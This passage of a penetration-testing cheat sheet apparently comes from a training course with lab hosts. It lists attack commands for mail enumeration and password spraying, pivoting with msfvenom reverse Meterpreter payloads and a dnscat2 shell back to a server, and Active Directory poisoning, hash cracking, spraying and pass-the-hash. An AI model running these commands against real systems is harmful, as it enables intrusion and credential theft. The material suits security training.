<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>host -t MX microsoft.com</code></td>
<td>DNS lookup for mail servers for the specified domain.</td>
</tr>
<tr class="even">
<td><code>dig mx inlanefreight.com \| grep "MX" \| grep -v ";"</code></td>
<td>DNS lookup for mail servers for the specified domain.</td>
</tr>
<tr class="odd">
<td><code>host -t A mail1.inlanefreight.htb.</code></td>
<td>DNS lookup of the IPv4 address for the specified subdomain.</td>
</tr>
<tr class="even">
<td><code>telnet 10.10.110.20 25</code></td>
<td>Connect to the SMTP server.</td>
</tr>
<tr class="odd">
<td><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></td>
<td>SMTP user enumeration using the RCPT command against the specified
host.</td>
</tr>
<tr class="even">
<td><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></td>
<td>Verify the usage of Office365 for the specified domain.</td>
</tr>
<tr class="odd">
<td><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></td>
<td>Enumerate existing users using Office365 on the specified
domain.</td>
</tr>
<tr class="even">
<td><code>python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz</code></td>
<td>Password spraying against a list of users that use Office365 for the
specified domain.</td>
</tr>
<tr class="odd">
<td><code>hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3</code></td>
<td>Brute-forcing the POP3 service.</td>
</tr>
<tr class="even">
<td><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213</code></td>
<td>Testing the SMTP service for the open-relay vulnerability.</td>
</tr>
</tbody>
</table>
<p><a id="12-pivoting-tunneling-and-port-forwarding"></a> ### 12.
Pivoting, Tunneling, and Port Forwarding</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>ifconfig</code></td>
<td>Linux-based command that displays all current network configurations
of a system.</td>
</tr>
<tr class="even">
<td><code>ipconfig</code></td>
<td>Windows-based command that displays all system network
configurations.</td>
</tr>
<tr class="odd">
<td><code>netstat -r</code></td>
<td>Command used to display the routing table for all IPv4-based
protocols.</td>
</tr>
<tr class="even">
<td><code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code></td>
<td>Nmap command used to scan a target for open ports allowing SSH or
MySQL connections.</td>
</tr>
<tr class="odd">
<td><code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code></td>
<td>SSH comand used to create an SSH tunnel from a local machine on
local port <code>1234</code> to a remote target using port 3306.</td>
</tr>
<tr class="even">
<td><code>netstat -antp \| grep 1234</code></td>
<td>Netstat option used to display network connections associated with a
tunnel created. Using <code>grep</code> to filter based on local port
<code>1234</code> .</td>
</tr>
<tr class="odd">
<td><code>nmap -v -sV -p1234 localhost</code></td>
<td>Nmap command used to scan a host through a connection that has been
made on local port <code>1234</code>.</td>
</tr>
<tr class="even">
<td><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code></td>
<td>SSH command that instructs the ssh client to request the SSH server
forward all data via port <code>1234</code> to
<code>localhost:3306</code>.</td>
</tr>
<tr class="odd">
<td><code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td>
<td>SSH command used to perform a dynamic port forward on port
<code>9050</code> and establishes an SSH tunnel with the target. This is
part of setting up a SOCKS proxy.</td>
</tr>
<tr class="even">
<td><code>tail -4 /etc/proxychains.conf</code></td>
<td>Linux-based command used to display the last 4 lines of
/etc/proxychains.conf. Can be used to ensure socks configurations are in
place.</td>
</tr>
<tr class="odd">
<td><code>proxychains nmap -v -sn 172.16.5.1-200</code></td>
<td>Used to send traffic generated by an Nmap scan through Proxychains
and a SOCKS proxy. Scan is performed against the hosts in the specified
range <code>172.16.5.1-200</code> with increased verbosity
(<code>-v</code>) disabling ping scan (<code>-sn</code>).</td>
</tr>
<tr class="even">
<td><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></td>
<td>Used to send traffic generated by an Nmap scan through Proxychains
and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased
verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>),
and using TCP connect scan type (<code>-sT</code>).</td>
</tr>
<tr class="odd">
<td><code>proxychains msfconsole</code></td>
<td>Uses Proxychains to open Metasploit and send all generated network
traffic through a SOCKS proxy.</td>
</tr>
<tr class="even">
<td><code>msf6 &gt; search rdp_scanner</code></td>
<td>Metasploit search that attempts to find a module called
<code>rdp_scanner</code>.</td>
</tr>
<tr class="odd">
<td><code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code></td>
<td>Used to connect to a target using RDP and a set of credentials using
proxychains. This will send all traffic through a SOCKS proxy.</td>
</tr>
<tr class="even">
<td><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></td>
<td>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter
payload that will send a call back to the IP address specified following
<code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>).
Payload will take the form of an executable file called
<code>backupscript.exe</code>.</td>
</tr>
<tr class="odd">
<td><code>msf6 &gt; use exploit/multi/handler</code></td>
<td>Used to select the multi-handler exploit module in Metasploit.</td>
</tr>
<tr class="even">
<td><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></td>
<td>Uses secure copy protocol (<code>scp</code>) to transfer the file
<code>backupscript.exe</code> to the specified host and places it in the
Ubuntu user’s home directory (<code>:~/</code>).</td>
</tr>
<tr class="odd">
<td><code>python3 -m http.server 8123</code></td>
<td>Uses Python3 to start a simple HTTP server listening on
port<code>8123</code>. Can be used to retrieve files from a host.</td>
</tr>
<tr class="even">
<td><code>Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"</code></td>
<td>PowerShell command used to download a file called backupscript.exe
from a webserver (<code>172.16.5.129:8123</code>) and then save the file
to location specified after <code>-OutFile</code>.</td>
</tr>
<tr class="odd">
<td><code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></td>
<td>SSH command used to create a reverse SSH tunnel from a target to an
attack host. Traffic is forwarded on port <code>8080</code> on the
attack host to port <code>80</code> on the target.</td>
</tr>
<tr class="even">
<td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></td>
<td>Uses msfveom to generate a Linux-based Meterpreter reverse TCP
payload that calls back to the IP specified after <code>LHOST=</code> on
port 8080 (<code>LPORT=8080</code>). Payload takes the form of an
executable elf file called backupjob.</td>
</tr>
<tr class="odd">
<td><code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></td>
<td>Metasploit command that runs a ping sweep module against the
specified network segment (<code>RHOSTS=172.16.5.0/23</code>).</td>
</tr>
<tr class="even">
<td></td>
<td></td>
</tr>
<tr class="odd">
<td><code>for i in {1...254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &amp;) ;done</code></td>
<td>For Loop used on a Linux-based system to discover devices in a
specified network segment.</td>
</tr>
<tr class="even">
<td><code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"</code></td>
<td>For Loop used on a Windows-based system to discover devices in a
specified network segment.</td>
</tr>
<tr class="odd">
<td><code>1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}</code></td>
<td>PowerShell one-liner used to ping addresses 1 - 254 in the specified
network segment.</td>
</tr>
<tr class="even">
<td><code>msf6 &gt; use auxiliary/server/socks_proxy</code></td>
<td>Metasploit command that selects the <code>socks_proxy</code>
auxiliary module.</td>
</tr>
<tr class="odd">
<td><code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code></td>
<td>Metasploit command that lists all currently running jobs.</td>
</tr>
<tr class="even">
<td><code>socks4   127.0.0.1 9050</code></td>
<td>Line of text that should be added to /etc/proxychains.conf to ensure
a SOCKS version 4 proxy is used in combination with proxychains on the
specified IP address and port.</td>
</tr>
<tr class="odd">
<td><code>Socks5 127.0.0.1 1080</code></td>
<td>Line of text that should be added to /etc/proxychains.conf to ensure
a SOCKS version 5 proxy is used in combination with proxychains on the
specified IP address and port.</td>
</tr>
<tr class="even">
<td><code>msf6 &gt; use post/multi/manage/autoroute</code></td>
<td>Metasploit command used to select the autoroute module.</td>
</tr>
<tr class="odd">
<td></td>
<td></td>
</tr>
<tr class="even">
<td><code>meterpreter &gt; help portfwd</code></td>
<td>Meterpreter command used to display the features of the portfwd
command.</td>
</tr>
<tr class="odd">
<td><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code></td>
<td>Meterpreter-based portfwd command that adds a forwarding rule to the
current Meterpreter session. This rule forwards network traffic on port
3300 on the local machine to port 3389 (RDP) on the target.</td>
</tr>
<tr class="even">
<td><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></td>
<td>Uses xfreerdp to connect to a remote host through localhost:3300
using a set of credentials. Port forwarding rules must be in place for
this to work properly.</td>
</tr>
<tr class="odd">
<td><code>netstat -antp</code></td>
<td>Used to display all (<code>-a</code>) active network connections
with associated process IDs. <code>-t</code> displays only TCP
connections.<code>-n</code> displays only numerical addresses.
<code>-p</code> displays process IDs associated with each displayed
connection.</td>
</tr>
<tr class="even">
<td><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code></td>
<td>Meterpreter-based portfwd command that adds a forwarding rule that
directs traffic coming on on port 8081 to the port <code>1234</code>
listening on the IP address of the Attack Host.</td>
</tr>
<tr class="odd">
<td><code>meterpreter &gt; bg</code></td>
<td>Meterpreter-based command used to run the selected metepreter
session in the background. Similar to background a process in Linux</td>
</tr>
<tr class="even">
<td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code></td>
<td>Uses Socat to listen on port 8080 and then to fork when the
connection is received. It will then connect to the attack host on port
80.</td>
</tr>
<tr class="odd">
<td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code></td>
<td>Uses Socat to listen on port 8080 and then to fork when the
connection is received. Then it will connect to the target host on port
8443.</td>
</tr>
<tr class="even">
<td><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td>
<td>Windows-based command that uses PuTTY’s Plink.exe to perform SSH
dynamic port forwarding and establishes an SSH tunnel with the specified
target. This will allow for proxy chaining on a Windows host, similar to
what is done with Proxychains on a Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>sudo apt-get install sshuttle</code></td>
<td>Uses apt-get to install the tool sshuttle.</td>
</tr>
<tr class="even">
<td><code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code></td>
<td>Runs sshuttle, connects to the target host, and creates a route to
the 172.16.5.0 network so traffic can pass from the attack host to hosts
on the internal network (<code>172.16.5.0</code>).</td>
</tr>
<tr class="odd">
<td><code>sudo git clone https://github.com/klsecservices/rpivot.git</code></td>
<td>Clones the rpivot project GitHub repository.</td>
</tr>
<tr class="even">
<td><code>sudo apt-get install python2.7</code></td>
<td>Uses apt-get to install python2.7.</td>
</tr>
<tr class="odd">
<td><code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></td>
<td>Used to run the rpivot server (<code>server.py</code>) on proxy port
<code>9050</code>, server port <code>9999</code> and listening on any IP
address (<code>0.0.0.0</code>).</td>
</tr>
<tr class="even">
<td><code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code></td>
<td>Uses secure copy protocol to transfer an entire directory and all of
its contents to a specified target.</td>
</tr>
<tr class="odd">
<td><code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></td>
<td>Used to run the rpivot client (<code>client.py</code>) to connect to
the specified rpivot server on the appropriate port.</td>
</tr>
<tr class="even">
<td><code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code></td>
<td>Opens firefox with Proxychains and sends the web request through a
SOCKS proxy server to the specified destination web server.</td>
</tr>
<tr class="odd">
<td><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></td>
<td>Use to run the rpivot client to connect to a web server that is
using HTTP-Proxy with NTLM authentication.</td>
</tr>
<tr class="even">
<td><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></td>
<td>Windows-based command that uses <code>netsh.exe</code> to configure
a portproxy rule called <code>v4tov4</code> that listens on port 8080
and forwards connections to the destination 172.16.5.25 on port
3389.</td>
</tr>
<tr class="odd">
<td><code>netsh.exe interface portproxy show v4tov4</code></td>
<td>Windows-based command used to view the configurations of a portproxy
rule called v4tov4.</td>
</tr>
<tr class="even">
<td><code>git clone https://github.com/iagox86/dnscat2.git</code></td>
<td>Clones the <code>dnscat2</code> project GitHub repository.</td>
</tr>
<tr class="odd">
<td><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></td>
<td>Used to start the dnscat2.rb server running on the specified IP
address, port (<code>53</code>) &amp; using the domain
<code>inlanefreight.local</code> with the no-cache option enabled.</td>
</tr>
<tr class="even">
<td><code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></td>
<td>Clones the dnscat2-powershell project Github repository.</td>
</tr>
<tr class="odd">
<td><code>Import-Module dnscat2.ps1</code></td>
<td>PowerShell command used to import the dnscat2.ps1 tool.</td>
</tr>
<tr class="even">
<td><code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></td>
<td>PowerShell command used to connect to a specified dnscat2 server
using a IP address, domain name and preshared secret. The client will
send back a shell connection to the server
(<code>-Exec cmd</code>).</td>
</tr>
<tr class="odd">
<td><code>dnscat2&gt; ?</code></td>
<td>Used to list dnscat2 options.</td>
</tr>
<tr class="even">
<td><code>dnscat2&gt; window -i 1</code></td>
<td>Used to interact with an established dnscat2 session.</td>
</tr>
<tr class="odd">
<td><code>./chisel server -v -p 1234 --socks5</code></td>
<td>Used to start a chisel server in verbose mode listening on port
<code>1234</code> using SOCKS version 5.</td>
</tr>
<tr class="even">
<td><code>./chisel client -v 10.129.202.64:1234 socks</code></td>
<td>Used to connect to a chisel server at the specified IP address &amp;
port using socks.</td>
</tr>
<tr class="odd">
<td><code>git clone https://github.com/utoni/ptunnel-ng.git</code></td>
<td>Clones the ptunnel-ng project GitHub repository.</td>
</tr>
<tr class="even">
<td><code>sudo ./autogen.sh</code></td>
<td>Used to run the autogen.sh shell script that will build the
necessary ptunnel-ng files.</td>
</tr>
<tr class="odd">
<td><code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></td>
<td>Used to start the ptunnel-ng server on the specified IP address
(<code>-r</code>) and corresponding port (<code>-R22</code>).</td>
</tr>
<tr class="even">
<td><code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></td>
<td>Used to connect to a specified ptunnel-ng server through local port
2222 (<code>-l2222</code>).</td>
</tr>
<tr class="odd">
<td><code>ssh -p2222 -lubuntu 127.0.0.1</code></td>
<td>SSH command used to connect to an SSH server through a local port.
This can be used to tunnel SSH traffic through an ICMP tunnel.</td>
</tr>
<tr class="even">
<td><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></td>
<td>Windows-based command used to register the
SocksOverRDP-PLugin.dll.</td>
</tr>
<tr class="odd">
<td><code>netstat -antb \|findstr 1080</code></td>
<td>Windows-based command used to list TCP network connections listening
on port 1080.</td>
</tr>
</tbody>
</table>
<p><a id="13-active-directory-enumeration--attacks"></a> ### 13. Active
Directory Enumeration &amp; Attacks</p>
<h4 id="initial-enumeration">Initial Enumeration</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>nslookup ns1.inlanefreight.com</code></td>
<td>Used to query the domain name system and discover the IP address to
domain name mapping of the target entered from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>sudo tcpdump -i ens224</code></td>
<td>Used to start capturing network packets on the network interface
proceeding the <code>-i</code> option a Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>sudo responder -I ens224 -A</code></td>
<td>Used to start responding to &amp; analyzing <code>LLMNR</code>,
<code>NBT-NS</code> and <code>MDNS</code> queries on the interface
specified proceeding the<code>-I</code> option and operating in
<code>Passive Analysis</code> mode which is activated using
<code>-A</code>. Performed from a Linux-based host</td>
</tr>
<tr class="even">
<td><code>fping -asgq 172.16.5.0/23</code></td>
<td>Performs a ping sweep on the specified network segment from a
Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td>
<td>Performs an nmap scan that with OS detection, version detection,
script scanning, and traceroute enabled (<code>-A</code>) based on a
list of hosts (<code>hosts.txt</code>) specified in the file proceeding
<code>-iL</code>. Then outputs the scan results to the file specified
after the <code>-oN</code>option. Performed from a Linux-based host</td>
</tr>
<tr class="even">
<td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td>
<td>Uses <code>git</code> to clone the kerbrute tool from a Linux-based
host.</td>
</tr>
<tr class="odd">
<td><code>make help</code></td>
<td>Used to list compiling options that are possible with
<code>make</code> from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>sudo make all</code></td>
<td>Used to compile a <code>Kerbrute</code> binary for multiple OS
platforms and CPU architectures.</td>
</tr>
<tr class="odd">
<td><code>./kerbrute_linux_amd64</code></td>
<td>Used to test the chosen complied <code>Kebrute</code> binary from a
Linux-based host.</td>
</tr>
<tr class="even">
<td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td>
<td>Used to move the <code>Kerbrute</code> binary to a directory can be
set to be in a Linux user’s path. Making it easier to use the tool.</td>
</tr>
<tr class="odd">
<td><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td>
<td>Runs the Kerbrute tool to discover usernames in the domain
(<code>INLANEFREIGHT.LOCAL</code>) specified proceeding the
<code>-d</code> option and the associated domain controller specified
proceeding <code>--dc</code>using a wordlist and outputs
(<code>-o</code>) the results to a specified file. Performed from a
Linux-based host.</td>
</tr>
</tbody>
</table>
<h4 id="llmnrntb-ns-poisoning">LLMNR/NTB-NS Poisoning</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>responder -h</code></td>
<td>Used to display the usage instructions and various options available
in <code>Responder</code> from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td>
<td>Uses <code>hashcat</code> to crack <code>NTLMv2</code>
(<code>-m</code>) hashes that were captured by responder and saved in a
file (<code>frond_ntlmv2</code>). The cracking is done based on a
specified wordlist.</td>
</tr>
<tr class="odd">
<td><code>Import-Module .\Inveigh.ps1</code></td>
<td>Using the <code>Import-Module</code> PowerShell cmd-let to import
the Windows-based tool <code>Inveigh.ps1</code>.</td>
</tr>
<tr class="even">
<td><code>(Get-Command Invoke-Inveigh).Parameters</code></td>
<td>Used to output many of the options &amp; functionality available
with <code>Invoke-Inveigh</code>. Peformed from a Windows-based
host.</td>
</tr>
<tr class="odd">
<td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td>
<td>Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp;
NBNS spoofing enabled and outputs the results to a file.</td>
</tr>
<tr class="even">
<td><code>.\Inveigh.exe</code></td>
<td>Starts the <code>C#</code> implementation of <code>Inveigh</code>
from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}</code></td>
<td>PowerShell script used to disable NBT-NS on a Windows host.</td>
</tr>
</tbody>
</table>
<h4 id="password-spraying-password-policies">Password Spraying &amp;
Password Policies</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done</code></td>
<td>Bash script used to generate <code>16,079,616</code> possible
username combinations from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td>
<td>Uses <code>CrackMapExec</code>and valid credentials
(<code>avazquez:Password123</code>) to enumerate the password policy
(<code>--pass-pol</code>) from a Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>rpcclient -U "" -N 172.16.5.5</code></td>
<td>Uses <code>rpcclient</code> to discover information about the domain
through <code>SMB NULL</code> sessions. Performed from a Linux-based
host.</td>
</tr>
<tr class="even">
<td><code>rpcclient $&gt; querydominfo</code></td>
<td>Uses <code>rpcclient</code> to enumerate the password policy in a
target Windows domain from a Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>enum4linux  -P 172.16.5.5</code></td>
<td>Uses <code>enum4linux</code> to enumerate the password policy
(<code>-P</code>) in a target Windows domain from a Linux-based
host.</td>
</tr>
<tr class="even">
<td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td>
<td>Uses <code>enum4linux-ng</code> to enumerate the password policy
(<code>-P</code>) in a target Windows domain from a Linux-based host,
then presents the output in YAML &amp; JSON saved in a file proceeding
the <code>-oA</code> option.</td>
</tr>
<tr class="odd">
<td><code>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength</code></td>
<td>Uses <code>ldapsearch</code> to enumerate the password policy in a
target Windows domain from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>net accounts</code></td>
<td>Used to enumerate the password policy in a Windows domain from a
Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Import-Module .\PowerView.ps1</code></td>
<td>Uses the Import-Module cmd-let to import the
<code>PowerView.ps1</code> tool from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-DomainPolicy</code></td>
<td>Used to enumerate the password policy in a target Windows domain
from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>enum4linux -U 172.16.5.5  \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"</code></td>
<td>Uses <code>enum4linux</code> to discover user accounts in a target
Windows domain, then leverages <code>grep</code> to filter the output to
just display the user from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>rpcclient -U "" -N 172.16.5.5  rpcclient $&gt; enumdomuser</code></td>
<td>Uses rpcclient to discover user accounts in a target Windows domain
from a Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>crackmapexec smb 172.16.5.5 --users</code></td>
<td>Uses <code>CrackMapExec</code> to discover users
(<code>--users</code>) in a target Windows domain from a Linux-based
host.</td>
</tr>
<tr class="even">
<td><code>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&amp;(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "</code></td>
<td>Uses <code>ldapsearch</code> to discover users in a target Windows
doman, then filters the output using <code>grep</code> to show only the
<code>sAMAccountName</code> from a Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>./windapsearch.py --dc-ip 172.16.5.5 -u "" -U</code></td>
<td>Uses the python tool <code>windapsearch.py</code> to discover users
in a target Windows domain from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done</code></td>
<td>Bash one-liner used to perform a password spraying attack using
<code>rpcclient</code> and a list of users
(<code>valid_users.txt</code>) from a Linux-based host. It also filters
out failed attempts to make the output cleaner.</td>
</tr>
<tr class="odd">
<td><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code></td>
<td>Uses <code>kerbrute</code> and a list of users
(<code>valid_users.txt</code>) to perform a password spraying attack
against a target Windows domain from a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +</code></td>
<td>Uses <code>CrackMapExec</code> and a list of users
(<code>valid_users.txt</code>) to perform a password spraying attack
against a target Windows domain from a Linux-based host. It also filters
out logon failures using <code>grep</code>.</td>
</tr>
<tr class="odd">
<td><code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td>
<td>Uses <code>CrackMapExec</code> to validate a set of credentials from
a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +</code></td>
<td>Uses <code>CrackMapExec</code> and the -<code>-local-auth</code>
flag to ensure only one login attempt is performed from a Linux-based
host. This is to ensure accounts are not locked out by enforced password
policies. It also filters out logon failures using
<code>grep</code>.</td>
</tr>
<tr class="odd">
<td><code>Import-Module .\DomainPasswordSpray.ps1</code></td>
<td>Used to import the PowerShell-based tool
<code>DomainPasswordSpray.ps1</code> from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td>
<td>Performs a password spraying attack and outputs (-OutFile) the
results to a specified file (<code>spray_success</code>) from a
Windows-based host.</td>
</tr>
</tbody>
</table>
<h4 id="enumerating-security-controls">Enumerating Security
Controls</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>Get-MpComputerStatus</code></td>
<td>PowerShell cmd-let used to check the status of
<code>Windows Defender Anti-Virus</code> from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections</code></td>
<td>PowerShell cmd-let used to view <code>AppLocker</code> policies from
a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>$ExecutionContext.SessionState.LanguageMode</code></td>
<td>PowerShell script used to discover the
<code>PowerShell Language Mode</code> being used on a Windows-based
host. Performed from a Windows-based host.</td>
</tr>
<tr class="even">
<td><code>Find-LAPSDelegatedGroups</code></td>
<td>A <code>LAPSToolkit</code> function that discovers
<code>LAPS Delegated Groups</code> from a Windows-based host.</td>
</tr>
<tr class="odd">
<td><code>Find-AdmPwdExtendedRights</code></td>
<td>A <code>LAPSTookit</code> function that checks the rights on each
computer with LAPS enabled for any groups with read access and users
with <code>All Extended Rights</code>. Performed from a Windows-based
host.</td>
</tr>
<tr class="even">
<td><code>Get-LAPSComputers</code></td>
<td>A <code>LAPSToolkit</code> function that searches for computers that
have LAPS enabled, discover password expiration and can discover
randomized passwords. Performed from a Windows-based host.</td>
</tr>
</tbody>
</table>
<h4 id="credentialed-enumeration">Credentialed Enumeration</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code></td>
<td>Connects to a Windows target using valid credentials. Performed from
a Linux-based host.</td>
</tr>
<tr class="even">
<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td>
<td>Authenticates with a Windows target over <code>smb</code> using
valid credentials and attempts to discover more users
(<code>--users</code>) in a target Windows domain. Performed from a
Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td>
<td>Authenticates with a Windows target over <code>smb</code> using
valid credentials and attempts to discover groups
(<code>--groups</code>) in a target Windows domain. Performed from a
Linux-based host.</td>
</tr>
<tr class="even">
<td><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td>
<td>Authenticates with a Windows target over <code>smb</code> using
valid credentials and attempts to check for a list of logged on users
(<code>--loggedon-users</code>) on the target Windows host. Performed
from a Linux-based host.</td>
</tr>
<tr class="odd">
<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td>
<td>Authenticates with a Windows target over <code>smb</code> using
valid credentials and attempts to discover any smb shares
(<code>--shares</code>). Performed from a Linux-based host.</td>
</tr>
<tr class="even">
